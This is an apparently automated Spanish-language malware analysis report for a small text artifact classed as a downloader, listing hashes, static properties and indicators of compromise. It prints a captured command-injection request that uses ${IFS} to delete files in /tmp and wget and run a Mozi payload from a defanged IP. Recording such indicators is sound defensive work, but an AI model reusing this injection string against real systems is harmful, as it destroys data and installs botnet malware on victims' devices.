# 🧬 Payload Analysis

`cba1f172531f87a33b5130d55bd807b3dca6454b2011cc0aef2ce79dd25ac4f0`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 160 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.a` en `hxxp://223.123.43.XXX:43525/Mozi.a`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:57:22.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `cba1f172531f87a33b5130d55bd807b3dca6454b2011cc0aef2ce79dd25ac4f0`
- **SHA1:** `09e012d959e62d897565246dd20632e6f0d306e4`
- **MD5:** `e6ce9ab47713182a16aa8539c239cc90`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 160 B |
| Entropía | 5.27 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://223.123.43.XXX:43525/Mozi.a;sh${IFS}/tmp/Moz
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://223.123.43.XXX:43525/Mozi.a;sh$ | strings |
| ip | 223.123.43.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://223.123.43.XXX:43525/Mozi.a;sh${IFS}/tmp/Moz | strings |
| hash | cba1f172531f87a33b5130d55bd807b3dca6454b2011cc0aef2ce79dd25ac4f0 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
